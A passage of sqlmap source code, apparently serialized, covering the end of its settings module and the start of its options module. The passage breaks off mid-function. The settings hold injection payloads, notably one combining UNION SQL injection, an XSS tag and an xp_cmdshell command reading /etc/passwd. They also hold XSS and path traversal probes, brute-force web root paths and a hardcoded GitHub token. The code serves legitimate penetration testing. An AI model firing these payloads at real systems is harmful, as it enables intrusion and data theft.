(\"3ds\", \"3g2\", \"3gp\", \"7z\", \"DS_Store\", \"a\", \"aac\", \"adp\", \"ai\", \"aif\", \"aiff\", \"apk\", \"ar\", \"asf\", \"au\", \"avi\", \"bak\", \"bin\", \"bk\", \"bmp\", \"btif\", \"bz2\", \"cab\", \"caf\", \"cgm\", \"cmx\", \"cpio\", \"cr2\", \"dat\", \"deb\", \"djvu\", \"dll\", \"dmg\", \"dmp\", \"dng\", \"doc\", \"docx\", \"dot\", \"dotx\", \"dra\", \"dsk\", \"dts\", \"dtshd\", \"dvb\", \"dwg\", \"dxf\", \"ear\", \"ecelp4800\", \"ecelp7470\", \"ecelp9600\", \"egg\", \"eol\", \"eot\", \"epub\", \"exe\", \"f4v\", \"fbs\", \"fh\", \"fla\", \"flac\", \"fli\", \"flv\", \"fpx\", \"fst\", \"fvt\", \"g3\", \"gif\", \"gz\", \"h261\", \"h263\", \"h264\", \"ico\", \"ief\", \"image\", \"img\", \"ipa\", \"iso\", \"jar\", \"jpeg\", \"jpg\", \"jpgv\", \"jpm\", \"jxr\", \"ktx\", \"lvp\", \"lz\", \"lzma\", \"lzo\", \"m3u\", \"m4a\", \"m4v\", \"mar\", \"mdi\", \"mid\", \"mj2\", \"mka\", \"mkv\", \"mmr\", \"mng\", \"mov\", \"movie\", \"mp3\", \"mp4\", \"mp4a\", \"mpeg\", \"mpg\", \"mpga\", \"mxu\", \"nef\", \"npx\", \"o\", \"oga\", \"ogg\", \"ogv\", \"otf\", \"pbm\", \"pcx\", \"pdf\", \"pea\", \"pgm\", \"pic\", \"png\", \"pnm\", \"ppm\", \"pps\", \"ppt\", \"pptx\", \"ps\", \"psd\", \"pya\", \"pyc\", \"pyo\", \"pyv\", \"qt\", \"rar\", \"ras\", \"raw\", \"rgb\", \"rip\", \"rlc\", \"rz\", \"s3m\", \"s7z\", \"scm\", \"scpt\", \"sgi\", \"shar\", \"sil\", \"smv\", \"so\", \"sub\", \"swf\", \"tar\", \"tbz2\", \"tga\", \"tgz\", \"tif\", \"tiff\", \"tlz\", \"ts\", \"ttf\", \"uvh\", \"uvi\", \"uvm\", \"uvp\", \"uvs\", \"uvu\", \"viv\", \"vob\", \"war\", \"wav\", \"wax\", \"wbmp\", \"wdp\", \"weba\", \"webm\", \"webp\", \"whl\", \"wm\", \"wma\", \"wmv\", \"wmx\", \"woff\", \"woff2\", \"wvx\", \"xbm\", \"xif\", \"xls\", \"xlsx\", \"xlt\", \"xm\", \"xpi\", \"xpm\", \"xwd\", \"xz\", \"z\", \"zip\", \"zipx\")\n\n# Patterns often seen in HTTP headers containing custom injection marking character '*'\nPROBLEMATIC_CUSTOM_INJECTION_PATTERNS = r\"(;q=[^;']+)|(\\*/\\*)\"\n\n# Template used for common table existence check\nBRUTE_TABLE_EXISTS_TEMPLATE = \"EXISTS(SELECT %d FROM %s)\"\n\n# Template used for common column existence check\nBRUTE_COLUMN_EXISTS_TEMPLATE = \"EXISTS(SELECT %s FROM %s)\"\n\n# Data inside shellcodeexec to be filled with random string\nSHELLCODEEXEC_RANDOM_STRING_MARKER = b\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n\n# Period after last-update to start nagging about the old revision\nLAST_UPDATE_NAGGING_DAYS = 180\n\n# Minimum non-writing chars (e.g. ['\"-:/]) ratio in case of parsed error messages\nMIN_ERROR_PARSING_NON_WRITING_RATIO = 0.05\n\n# Generic address for checking the Internet connection while using switch --check-internet (Note: https version does not work for Python < 2.7.9)\nCHECK_INTERNET_ADDRESS = \"http://ipinfo.io/json\"\n\n# Value to look for in response to CHECK_INTERNET_ADDRESS\nCHECK_INTERNET_VALUE = '\"ip\":'\n\n# Payload used for checking of existence of WAF/IPS (dummier the better)\nIPS_WAF_CHECK_PAYLOAD = \"AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"\n\n# Vectors used for provoking specific WAF/IPS behavior(s)\nWAF_ATTACK_VECTORS = (\n    \"\",  # NIL\n    \"search=<script>alert(1)</script>\",\n    \"file=../../../../etc/passwd\",\n    \"q=<invalid>foobar\",\n    \"id=1 %s\" % IPS_WAF_CHECK_PAYLOAD\n)\n\n# Used for status representation in dictionary attack phase\nROTATING_CHARS = ('\\\\', '|', '|', '/', '-')\n\n# Approximate chunk length (in bytes) used by BigArray objects (only last chunk and cached one are held in memory)\nBIGARRAY_CHUNK_SIZE = 1024 * 1024\n\n# Compress level used for storing BigArray chunks to disk (0-9)\nBIGARRAY_COMPRESS_LEVEL = 9\n\n# Maximum number of socket pre-connects\nSOCKET_PRE_CONNECT_QUEUE_SIZE = 3\n\n# Only console display last n table rows\nTRIM_STDOUT_DUMP_SIZE = 256\n\n# Reference: http://stackoverflow.com/a/3168436\n# Reference: https://web.archive.org/web/20150407141500/https://support.microsoft.com/en-us/kb/899149\nDUMP_FILE_BUFFER_SIZE = 1024\n\n# Parse response headers only first couple of times\nPARSE_HEADERS_LIMIT = 3\n\n# Step used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_STEP = 10\n\n# Maximum value used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_MAX = 1000\n\n# Maximum number of times for revalidation of a character in inference (as required)\nMAX_REVALIDATION_STEPS = 5\n\n# Characters that can be used to split parameter values in provided command line (e.g. in --tamper)\nPARAMETER_SPLITTING_REGEX = r\"[,|;]\"\n\n# Attribute used for storing original parameter value in special cases (e.g. POST)\nUNENCODED_ORIGINAL_VALUE = \"original\"\n\n# Common column names containing usernames (used for hash cracking in some cases)\nCOMMON_USER_COLUMNS = (\"login\", \"user\", \"username\", \"user_name\", \"user_login\", \"benutzername\", \"benutzer\", \"utilisateur\", \"usager\", \"consommateur\", \"utente\", \"utilizzatore\", \"utilizator\", \"utilizador\", \"usufrutuario\", \"korisnik\", \"uporabnik\", \"usuario\", \"consumidor\", \"client\", \"cuser\")\n\n# Default delimiter in GET/POST values\nDEFAULT_GET_POST_DELIMITER = '&'\n\n# Default delimiter in cookie values\nDEFAULT_COOKIE_DELIMITER = ';'\n\n# Unix timestamp used for forcing cookie expiration when provided with --load-cookies\nFORCE_COOKIE_EXPIRATION_TIME = \"9999999999\"\n\n# Github OAuth token used for creating an automatic Issue for unhandled exceptions\nGITHUB_REPORT_OAUTH_TOKEN = \"Z2hwX0pNd0I2U25kN2Q5QmxlWkhxZmkxVXZTSHZiTlRDWjE5NUNpNA\"\n\n# Skip unforced HashDB flush requests below the threshold number of cached items\nHASHDB_FLUSH_THRESHOLD = 32\n\n# Number of retries for unsuccessful HashDB flush attempts\nHASHDB_FLUSH_RETRIES = 3\n\n# Number of retries for unsuccessful HashDB retrieve attempts\nHASHDB_RETRIEVE_RETRIES = 3\n\n# Number of retries for unsuccessful HashDB end transaction attempts\nHASHDB_END_TRANSACTION_RETRIES = 3\n\n# Unique milestone value used for forced deprecation of old HashDB values (e.g. when changing hash/pickle mechanism)\nHASHDB_MILESTONE_VALUE = \"OdqjeUpBLc\"  # python -c 'import random, string; print \"\".join(random.sample(string.ascii_letters, 10))'\n\n# Pickle protocl used for storage of serialized data inside HashDB (https://docs.python.org/3/library/pickle.html#data-stream-format)\nPICKLE_PROTOCOL = 2\n\n# Warn user of possible delay due to large page dump in full UNION query injections\nLARGE_OUTPUT_THRESHOLD = 1024 ** 2\n\n# On huge tables there is a considerable slowdown if every row retrieval requires ORDER BY (most noticable in table dumping using ERROR injections)\nSLOW_ORDER_COUNT_THRESHOLD = 10000\n\n# Give up on hash recognition if nothing was found in first given number of rows\nHASH_RECOGNITION_QUIT_THRESHOLD = 1000\n\n# Regular expression used for automatic hex conversion and hash cracking of (RAW) binary column values\nHASH_BINARY_COLUMNS_REGEX = r\"(?i)pass|psw|hash\"\n\n# Maximum number of redirections to any single URL - this is needed because of the state that cookies introduce\nMAX_SINGLE_URL_REDIRECTIONS = 4\n\n# Maximum total number of redirections (regardless of URL) - before assuming we're in a loop\nMAX_TOTAL_REDIRECTIONS = 10\n\n# Maximum (deliberate) delay used in page stability check\nMAX_STABILITY_DELAY = 0.5\n\n# Reference: http://www.tcpipguide.com/free/t_DNSLabelsNamesandSyntaxRules.htm\nMAX_DNS_LABEL = 63\n\n# Alphabet used for prefix and suffix strings of name resolution requests in DNS technique (excluding hexadecimal chars for not mixing with inner content)\nDNS_BOUNDARIES_ALPHABET = re.sub(r\"[a-fA-F]\", \"\", string.ascii_letters)\n\n# Alphabet used for heuristic checks\nHEURISTIC_CHECK_ALPHABET = ('\"', '\\'', ')', '(', ',', '.')\n\n# Minor artistic touch\nBANNER = re.sub(r\"\\[.\\]\", lambda _: \"[\\033[01;41m%s\\033[01;49m]\" % random.sample(HEURISTIC_CHECK_ALPHABET, 1)[0], BANNER)\n\n# String used for dummy non-SQLi (e.g. XSS) heuristic checks of a tested parameter value\nDUMMY_NON_SQLI_CHECK_APPENDIX = \"<'\\\">\"\n\n# Regular expression used for recognition of file inclusion errors\nFI_ERROR_REGEX = r\"(?i)[^\\n]{0,100}(no such file|failed (to )?open)[^\\n]{0,100}\"\n\n# Length of prefix and suffix used in non-SQLI heuristic checks\nNON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH = 6\n\n# Connection read size (processing large responses in parts to avoid MemoryError crashes - e.g. large table dump in full UNION injections)\nMAX_CONNECTION_READ_SIZE = 10 * 1024 * 1024\n\n# Maximum response total page size (trimmed if larger)\nMAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024\n\n# For preventing MemoryError exceptions (caused when using large sequences in difflib.SequenceMatcher)\nMAX_DIFFLIB_SEQUENCE_LENGTH = 10 * 1024 * 1024\n\n# Page size threshold used in heuristic checks (e.g. getHeuristicCharEncoding(), identYwaf, htmlParser, etc.)\nHEURISTIC_PAGE_SIZE_THRESHOLD = 64 * 1024\n\n# Maximum (multi-threaded) length of entry in bisection algorithm\nMAX_BISECTION_LENGTH = 50 * 1024 * 1024\n\n# Mark used for trimming unnecessary content in large connection reads\nLARGE_READ_TRIM_MARKER = \"__TRIMMED_CONTENT__\"\n\n# Generic SQL comment formation\nGENERIC_SQL_COMMENT = \"-- [RANDSTR]\"\n\n# Threshold value for turning back on time auto-adjustment mechanism\nVALID_TIME_CHARS_RUN_THRESHOLD = 100\n\n# Check for empty columns only if table is sufficiently large\nCHECK_ZERO_COLUMNS_THRESHOLD = 10\n\n# Boldify all logger messages containing these \"patterns\"\nBOLD_PATTERNS = (\"' injectable\", \"provided empty\", \"leftover chars\", \"might be injectable\", \"' is vulnerable\", \"is not injectable\", \"does not seem to be\", \"test failed\", \"test passed\", \"live test final result\", \"test shows that\", \"the back-end DBMS is\", \"created Github\", \"blocked by the target server\", \"protection is involved\", \"CAPTCHA\", \"specific response\", \"NULL connection is supported\", \"PASSED\", \"FAILED\", \"for more than\", \"connection to \")\n\n# TLDs used in randomization of email-alike parameter values\nRANDOMIZATION_TLDS = (\"com\", \"net\", \"ru\", \"org\", \"de\", \"uk\", \"br\", \"jp\", \"cn\", \"fr\", \"it\", \"pl\", \"tv\", \"edu\", \"in\", \"ir\", \"es\", \"me\", \"info\", \"gr\", \"gov\", \"ca\", \"co\", \"se\", \"cz\", \"to\", \"vn\", \"nl\", \"cc\", \"az\", \"hu\", \"ua\", \"be\", \"no\", \"biz\", \"io\", \"ch\", \"ro\", \"sk\", \"eu\", \"us\", \"tw\", \"pt\", \"fi\", \"at\", \"lt\", \"kz\", \"cl\", \"hr\", \"pk\", \"lv\", \"la\", \"pe\", \"au\")\n\n# Generic www root directory names\nGENERIC_DOC_ROOT_DIRECTORY_NAMES = (\"htdocs\", \"httpdocs\", \"public\", \"wwwroot\", \"www\")\n\n# Maximum length of a help part containing switch/option name(s)\nMAX_HELP_OPTION_LENGTH = 18\n\n# Maximum number of connection retries (to prevent problems with recursion)\nMAX_CONNECT_RETRIES = 100\n\n# Strings for detecting formatting errors\nFORMAT_EXCEPTION_STRINGS = (\"Type mismatch\", \"Error converting\", \"Please enter a\", \"Conversion failed\", \"String or binary data would be truncated\", \"Failed to convert\", \"unable to interpret text value\", \"Input string was not in a correct format\", \"System.FormatException\", \"java.lang.NumberFormatException\", \"ValueError: invalid literal\", \"TypeMismatchException\", \"CF_SQL_INTEGER\", \"CF_SQL_NUMERIC\", \" for CFSQLTYPE \", \"cfqueryparam cfsqltype\", \"InvalidParamTypeException\", \"Invalid parameter type\", \"Attribute validation error for tag\", \"is not of type numeric\", \"<cfif Not IsNumeric(\", \"invalid input syntax for integer\", \"invalid input syntax for type\", \"invalid number\", \"character to number conversion error\", \"unable to interpret text value\", \"String was not recognized as a valid\", \"Convert.ToInt\", \"cannot be converted to a \", \"InvalidDataException\", \"Arguments are of the wrong type\")\n\n# Regular expression used for extracting ASP.NET view state values\nVIEWSTATE_REGEX = r'(?i)(?P<name>__VIEWSTATE[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n\n# Regular expression used for extracting ASP.NET event validation values\nEVENTVALIDATION_REGEX = r'(?i)(?P<name>__EVENTVALIDATION[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n\n# Number of rows to generate inside the full union test for limited output (mustn't be too large to prevent payload length problems)\nLIMITED_ROWS_TEST_NUMBER = 15\n\n# Default adapter to use for bottle server\nRESTAPI_DEFAULT_ADAPTER = \"wsgiref\"\n\n# Default REST-JSON API server listen address\nRESTAPI_DEFAULT_ADDRESS = \"127.0.0.1\"\n\n# Default REST-JSON API server listen port\nRESTAPI_DEFAULT_PORT = 8775\n\n# Unsupported options by REST-JSON API server\nRESTAPI_UNSUPPORTED_OPTIONS = (\"sqlShell\", \"wizard\")\n\n# Use \"Supplementary Private Use Area-A\"\nINVALID_UNICODE_PRIVATE_AREA = False\n\n# Format used for representing invalid unicode characters\nINVALID_UNICODE_CHAR_FORMAT = r\"\\x%02x\"\n\n# Regular expression for XML POST data\nXML_RECOGNITION_REGEX = r\"(?s)\\A\\s*<[^>]+>(.+>)?\\s*\\Z\"\n\n# Regular expression used for detecting JSON POST data\nJSON_RECOGNITION_REGEX = r'(?s)\\A(\\s*\\[)*\\s*\\{.*\"[^\"]+\"\\s*:\\s*(\"[^\"]*\"|\\d+|true|false|null|\\[).*\\}\\s*(\\]\\s*)*\\Z'\n\n# Regular expression used for detecting JSON-like POST data\nJSON_LIKE_RECOGNITION_REGEX = r\"(?s)\\A(\\s*\\[)*\\s*\\{.*('[^']+'|\\\"[^\\\"]+\\\"|\\w+)\\s*:\\s*('[^']+'|\\\"[^\\\"]+\\\"|\\d+).*\\}\\s*(\\]\\s*)*\\Z\"\n\n# Regular expression used for detecting multipart POST data\nMULTIPART_RECOGNITION_REGEX = r\"(?i)Content-Disposition:[^;]+;\\s*name=\"\n\n# Regular expression used for detecting Array-like POST data\nARRAY_LIKE_RECOGNITION_REGEX = r\"(\\A|%s)(\\w+)\\[\\d*\\]=.+%s\\2\\[\\d*\\]=\" % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)\n\n# Default POST data content-type\nDEFAULT_CONTENT_TYPE = \"application/x-www-form-urlencoded; charset=utf-8\"\n\n# Raw text POST data content-type\nPLAIN_TEXT_CONTENT_TYPE = \"text/plain; charset=utf-8\"\n\n# Length used while checking for existence of Suhosin-patch (like) protection mechanism\nSUHOSIN_MAX_VALUE_LENGTH = 512\n\n# Minimum size of an (binary) entry before it can be considered for dumping to disk\nMIN_BINARY_DISK_DUMP_SIZE = 100\n\n# Filenames of payloads xml files (in order of loading)\nPAYLOAD_XML_FILES = (\"boolean_blind.xml\", \"error_based.xml\", \"inline_query.xml\", \"stacked_queries.xml\", \"time_blind.xml\", \"union_query.xml\")\n\n# Regular expression used for extracting form tags\nFORM_SEARCH_REGEX = r\"(?si)<form(?!.+<form).+?</form>\"\n\n# Maximum number of lines to save in history file\nMAX_HISTORY_LENGTH = 1000\n\n# Minimum field entry length needed for encoded content (hex, base64,...) check\nMIN_ENCODED_LEN_CHECK = 5\n\n# Timeout in seconds in which Metasploit remote session has to be initialized\nMETASPLOIT_SESSION_TIMEOUT = 120\n\n# Reference: http://www.postgresql.org/docs/9.0/static/catalog-pg-largeobject.html\nLOBLKSIZE = 2048\n\n# Prefix used to mark special variables (e.g. keywords, having special chars, etc.)\nEVALCODE_ENCODED_PREFIX = \"EVAL_\"\n\n# Reference: https://en.wikipedia.org/wiki/Zip_(file_format)\nZIP_HEADER = b\"\\x50\\x4b\\x03\\x04\"\n\n# Reference: http://www.cookiecentral.com/faq/#3.5\nNETSCAPE_FORMAT_HEADER_COOKIES = \"# Netscape HTTP Cookie File.\"\n\n# Infixes used for automatic recognition of parameters carrying anti-CSRF tokens\nCSRF_TOKEN_PARAMETER_INFIXES = (\"csrf\", \"xsrf\", \"token\")\n\n# Prefixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_PREFIXES = {\n    OS.LINUX: (\"/var/www\", \"/usr/local/apache\", \"/usr/local/apache2\", \"/usr/local/www/apache22\", \"/usr/local/www/apache24\", \"/usr/local/httpd\", \"/var/www/nginx-default\", \"/srv/www\", \"/var/www/%TARGET%\", \"/var/www/vhosts/%TARGET%\", \"/var/www/virtual/%TARGET%\", \"/var/www/clients/vhosts/%TARGET%\", \"/var/www/clients/virtual/%TARGET%\"),\n    OS.WINDOWS: (\"/xampp\", \"/Program Files/xampp\", \"/wamp\", \"/Program Files/wampp\", \"/Apache/Apache\", \"/apache\", \"/Program Files/Apache Group/Apache\", \"/Program Files/Apache Group/Apache2\", \"/Program Files/Apache Group/Apache2.2\", \"/Program Files/Apache Group/Apache2.4\", \"/Inetpub/wwwroot\", \"/Inetpub/wwwroot/%TARGET%\", \"/Inetpub/vhosts/%TARGET%\")\n}\n\n# Suffixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_SUFFIXES = (\"\", \"html\", \"htdocs\", \"httpdocs\", \"php\", \"public\", \"src\", \"site\", \"build\", \"web\", \"www\", \"data\", \"sites/all\", \"www/build\")\n\n# String used for marking target name inside used brute force web server document root\nBRUTE_DOC_ROOT_TARGET_MARK = \"%TARGET%\"\n\n# Character used as a boundary in kb.chars (preferably less frequent letter)\nKB_CHARS_BOUNDARY_CHAR = 'q'\n\n# Letters of lower frequency used in kb.chars\nKB_CHARS_LOW_FREQUENCY_ALPHABET = \"zqxjkvbp\"\n\n# Printable bytes\nPRINTABLE_BYTES = set(bytes(string.printable, \"ascii\") if six.PY3 else string.printable)\n\n# SQL keywords used for splitting in HTTP chunked transfer encoded requests (switch --chunk)\nHTTP_CHUNKED_SPLIT_KEYWORDS = (\"SELECT\", \"UPDATE\", \"INSERT\", \"FROM\", \"LOAD_FILE\", \"UNION\", \"information_schema\", \"sysdatabases\", \"msysaccessobjects\", \"msysqueries\", \"sysmodules\")\n\n# CSS style used in HTML dump format\nHTML_DUMP_CSS_STYLE = \"\"\"<style>\ntable{\n    margin:10;\n    background-color:#FFFFFF;\n    font-family:verdana;\n    font-size:12px;\n    align:center;\n}\nthead{\n    font-weight:bold;\n    background-color:#4F81BD;\n    color:#FFFFFF;\n}\ntr:nth-child(even) {\n    background-color: #D3DFEE\n}\ntd{\n    font-size:12px;\n}\nth{\n    font-size:12px;\n}\n</style>\"\"\"\n\n# Leaving (dirty) possibility to change values from here (e.g. `export SQLMAP__MAX_NUMBER_OF_THREADS=20`)\nfor key, value in os.environ.items():\n    if key.upper().startswith(\"%s_\" % SQLMAP_ENVIRONMENT_PREFIX):\n        _ = key[len(SQLMAP_ENVIRONMENT_PREFIX) + 1:].upper()\n        if _ in globals():\n            original = globals()[_]\n            if isinstance(original, int):\n                try:\n                    globals()[_] = int(value)\n                except ValueError:\n                    pass\n            elif isinstance(original, bool):\n                globals()[_] = value.lower() in ('1', 'true')\n            elif isinstance(original, (list, tuple)):\n                globals()[_] = [__.strip() for __ in _.split(',')]\n            else:\n                globals()[_] = value\n", "lib/core/option.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport codecs\nimport functools\nimport glob\nimport inspect\nimport logging\nimport os\nimport random\nimport re\nimport socket\nimport sys\nimport tempfile\nimport threading\nimport time\nimport traceback\n\nfrom lib.controller.checks import checkConnection\nfrom lib.core.common import Backend\nfrom lib.core.common import boldifyMessage\nfrom lib.core.common import checkFile\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import decodeStringEscape\nfrom lib.core.common import fetchRandomAgent\nfrom lib.core.common import filterNone\nfrom lib.core.common import findLocalPort\nfrom lib.core.common import findPageForms\nfrom lib.core.common import getConsoleWidth\nfrom lib.core.common import getFileItems\nfrom lib.core.common import getFileType\nfrom lib.core.common import getPublicTypeMembers\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import intersect\nfrom lib.core.common import normalizePath\nfrom lib.core.common import ntToPosixSlashes\nfrom lib.core.common import openFile\nfrom lib.core.common import parseRequestFile\nfrom lib.core.common import parseTargetDirect\nfrom lib.core.common import paths\nfrom lib.core.common import randomStr\nfrom lib.core.common import readCachedFileContent\nfrom lib.core.common import readInput\nfrom lib.core.common import resetCookieJar\nfrom lib.core.common import runningAsAdmin\nfrom lib.core.common import safeExpandUser\nfrom lib.core.common import safeFilepathEncode\nfrom lib.core.common import saveConfig\nfrom lib.core.common import setColor\nfrom lib.core.common import setOptimize\nfrom lib.core.common import setPaths\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import urldecode\nfrom lib.core.compat import cmp\nfrom lib.core.compat import round\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import mergedOptions\nfrom lib.core.data import queries\nfrom lib.core.datatype import AttribDict\nfrom lib.core.datatype import InjectionDict\nfrom lib.core.datatype import OrderedSet\nfrom lib.core.defaults import defaults\nfrom lib.core.dicts import DBMS_DICT\nfrom lib.core.dicts import DUMP_REPLACEMENTS\nfrom lib.core.enums import ADJUST_TIME_DELAY\nfrom lib.core.enums import AUTH_TYPE\nfrom lib.core.enums import CUSTOM_LOGGING\nfrom lib.core.enums import DUMP_FORMAT\nfrom lib.core.enums import FORK\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import HTTPMETHOD\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.enums import MOBILES\nfrom lib.core.enums import OPTION_TYPE\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PRIORITY\nfrom lib.core.enums import PROXY_TYPE\nfrom lib.core.enums import REFLECTIVE_COUNTER\nfrom lib.core.enums import WIZARD\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapGenericException\nfrom lib.core.exception import SqlmapInstallationException\nfrom lib.core.exception import SqlmapMissingDependence\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapMissingPrivileges\nfrom lib.core.exception import SqlmapSilentQuitException\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.exception import SqlmapUnsupportedDBMSException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.exception import SqlmapValueException\nfrom lib.core.log import FORMATTER\nfrom lib.core.optiondict import optDict\nfrom lib.core.settings import CODECS_LIST_PAGE\nfrom lib.core.settings import CUSTOM_INJECTION_MARK_CHAR\nfrom lib.core.settings import DBMS_ALIASES\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\nfrom lib.core.settings import DEFAULT_PAGE_ENCODING\nfrom lib.core.settings import DEFAULT_TOR_HTTP_PORTS\nfrom lib.core.settings import DEFAULT_TOR_SOCKS_PORTS\nfrom lib.core.settings import DEFAULT_USER_AGENT\nfrom lib.core.settings import DUMMY_URL\nfrom lib.core.settings import IGNORE_CODE_WILDCARD\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import KB_CHARS_BOUNDARY_CHAR\nfrom lib.core.settings import KB_CHARS_LOW_FREQUENCY_ALPHABET\nfrom lib.core.settings import LOCALHOST\nfrom lib.core.settings import MAX_CONNECT_RETRIES\nfrom lib.core.settings import MAX_NUMBER_OF_THREADS\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PARAMETER_SPLITTING_REGEX\nfrom lib.core.settings import PRECONNECT_CANDIDATE_TIMEOUT\nfrom lib.core.settings import PROXY_ENVIRONMENT_VARIABLES\nfrom lib.core.settings import SOCKET_PRE_CONNECT_QUEUE_SIZE\nfrom lib.core.settings import SQLMAP_ENVIRONMENT_PREFIX\nfrom lib.core.settings import SUPPORTED_DBMS\nfrom lib.core.settings import SUPPORTED_OS\nfrom lib.core.settings import TIME_DELAY_CANDIDATES\nfrom lib.core.settings import UNKNOWN_DBMS_VERSION\nfrom lib.core.settings import URI_INJECTABLE_REGEX\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.threads import setDaemon\nfrom lib.core.update import update\nfrom lib.parse.configfile import configFileParser\nfrom lib.parse.payloads import loadBoundaries\nfrom lib.parse.payloads import loadPayloads\nfrom lib.request.basic import checkCharEncoding\nfrom lib.request.basicauthhandler import SmartHTTPBasicAuthHandler\nfrom lib.request.chunkedhandler import ChunkedHandler\nfrom lib.request.connect import Connect as Request\nfrom lib.request.dns import DNSServer\nfrom lib.request.httpshandler import HTTPSHandler\nfrom lib.request.pkihandler import HTTPSPKIAuthHandler\nfrom lib.request.rangehandler import HTTPRangeHandler\nfrom lib.request.redirecthandler import SmartRedirectHandler\nfrom lib.utils.crawler import crawl\nfrom lib.utils.deps import checkDependencies\nfrom lib.utils.har import HTTPCollectorFactory\nfrom lib.utils.purge import purge\nfrom lib.utils.search import search\nfrom thirdparty import six\nfrom thirdparty.keepalive import keepalive\nfrom thirdparty.multipart import multipartpost\nfrom thirdparty.six.moves import collections_abc as _collections\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import http_cookiejar as _http_cookiejar\nfrom thirdparty.six.moves import urllib as _urllib\nfrom thirdparty.socks import socks\nfrom xml.etree.ElementTree import ElementTree\n\nauthHandler = _urllib.request.BaseHandler()\nchunkedHandler = ChunkedHandler()\nhttpsHandler = HTTPSHandler()\nkeepAliveHandler = keepalive.HTTPHandler()\nproxyHandler = _urllib.request.ProxyHandler()\nredirectHandler = SmartRedirectHandler()\nrangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError\nexcept NameError:\n    WindowsError = None\n\ndef _loadQueries():\n    \"\"\"\n    Loads queries from 'xml/queries.xml' file.\n    \"\"\"\n\n    def iterate(node, retVal=None):\n        class DictObject(object):\n            def __init__(self):\n                self.__dict__ = {}\n\n            def __contains__(self, name):\n                return name in self.__dict__\n\n        if retVal is None:\n            retVal = DictObject()\n\n        for child in node.findall(\"*\"):\n            instance = DictObject()\n            retVal.__dict__[child.tag] = instance\n            if child.attrib:\n                instance.__dict__.update(child.attrib)\n            else:\n                iterate(child, instance)\n\n        return retVal\n\n    tree = ElementTree()\n    try:\n        tree.parse(paths.QUERIES_XML)\n    except Exception as ex:\n        errMsg = \"something appears to be wrong with \"\n        errMsg += \"the file '%s' ('%s'). Please make \" % (paths.QUERIES_XML, getSafeExString(ex))\n        errMsg += \"sure that you haven't made any changes to it\"\n        raise SqlmapInstallationException(errMsg)\n\n    for node in tree.findall(\"*\"):\n        queries[node.attrib['value']] = iterate(node)\n\ndef _setMultipleTargets():\n    \"\"\"\n    Define a configuration parameter if we are running in multiple target\n    mode.\n    \"\"\"\n\n    initialTargetsCount = len(kb.targets)\n    seen = set()\n\n    if not conf.logFile:\n        return\n\n    debugMsg = \"parsing targets list from '%s'\" % conf.logFile\n    logger.debug(debugMsg)\n\n    if not os.path.exists(conf.logFile):\n        errMsg = \"the specified list of targets does not exist\"\n        raise SqlmapFilePathException(errMsg)\n\n    if checkFile(conf.logFile, False):\n        for target in parseRequestFile(conf.logFile):\n            url, _, data, _, _ = target\n            key = re.sub(r\"(\\w+=)[^%s ]*\" % (conf.paramDel or DEFAULT_GET_POST_DELIMITER), r\"\\g<1>\", \"%s %s\" % (url, data))\n            if key not in seen:\n                kb.targets.add(target)\n                seen.add(key)\n\n    elif os.path.isdir(conf.logFile):\n        files = os.listdir(conf.logFile)\n        files.sort()\n\n        for reqFile in files:\n            if not re.search(r\"([\\d]+)\\-request\", reqFile):\n                continue\n\n            for target in parseRequestFile(os.path.join(conf.logFile, reqFile)):\n                url, _, data, _, _ = target\n                key = re.sub(r\"(\\w+=)[^%s ]*\" % (conf.paramDel or DEFAULT_GET_POST_DELIMITER), r\"\\g<1>\", \"%s %s\" % (url, data))\n                if key not in seen:\n                    kb.targets.add(target)\n                    seen.add(key)\n\n    else:\n        errMsg = \"the specified list of targets is not a file \"\n        errMsg += \"nor a directory\"\n        raise SqlmapFilePathException(errMsg)\n\n    updatedTargetsCount = len(kb.targets)\n\n    if updatedTargetsCount > initialTargetsCount:\n        infoMsg = \"sqlmap parsed %d \" % (updatedTargetsCount - initialTargetsCount)\n        infoMsg += \"(parameter unique) requests from the \"\n        infoMsg += \"targets list ready to be tested\"\n        logger.info(infoMsg)\n\ndef _adjustLoggingFormatter():\n    \"\"\"\n    Solves problem of line deletition caused by overlapping logging messages\n    and retrieved data info in inference mode\n    \"\"\"\n\n    if hasattr(FORMATTER, '_format'):\n        return\n\n   